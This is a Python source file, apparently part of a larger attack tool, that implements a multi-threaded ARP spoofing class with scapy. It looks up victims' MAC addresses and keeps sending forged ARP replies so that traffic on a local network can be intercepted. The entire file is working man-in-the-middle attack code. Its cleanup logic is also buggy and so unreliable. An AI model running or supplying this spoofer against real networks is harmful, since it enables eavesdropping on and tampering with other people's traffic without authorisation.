import time
import scapy.all as scapy
from threading import Thread, Event
from libs import logger as _

log = _.log
ip  = ""

# execute arp spoofing (is Multi-threaded)
class spoofer(Thread):
    pkts    = []
    targets = {}

    # restoring real MACs
    def restore(self, target):
        pkt = scapy.ARP(op=2, pdst=target, hwdst=self.targets[target], psrc=self.addr, hwsrc=self.hwaddr)
        scapy.send(pkt, verbose=False)
        # delete the value from the instance

    # get the mac from the network
    def get_mac(self, ip):
        # ARP request
        req = scapy.ARP(pdst=ip)
        # Broadcast Ethernet layer
        brd = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        # Build the packet
        arp_req = brd / req
        # wait for the response (2 seconds)
        res = scapy.srp(arp_req, timeout=2, verbose=False)[0]
        # getting the MAC
        return res[0][1].hwsrc

    # We'll send the packet to the target by pretending being the victim
    def spoof(self, victim, target):
        target_mac = self.get_mac(victim)
        self.targets[target] = target_mac
        self.pkts.append(scapy.ARP(op=2, hwdst=target_mac, pdst=target, psrc=victim))

    # Thread routine
    def run(self):
        try:
            while not self.exit.is_set():
                for spoof in self.pkts:
                    scapy.send(spoof, verbose=False)
                time.sleep(self.delay)
        except KeyboardInterrupt or self.exit.is_set():
            for key in self.targets.keys():
                self.restore(self.targets.pop(key))

    # Start the spoofer
    def exec(self):
        self.exit.clear()
        self.start()
        log.print("ARP Spoofing started, waiting 3,5 seconds...")
        time.sleep(3.5)

    # Fire the stop event
    def stop(self):
        self.exit.set();
        log.print("ARP Spoofing stopping, waiting 1 second...")
        time.sleep(1)

    # We know our mac and ip already let save them
    def __init__(self, mac, ip, delay = 1):
        super(spoofer, self).__init__()
        self.exit = Event()
        self.hwaddr = mac
        self.addr = ip
        self.delay = delay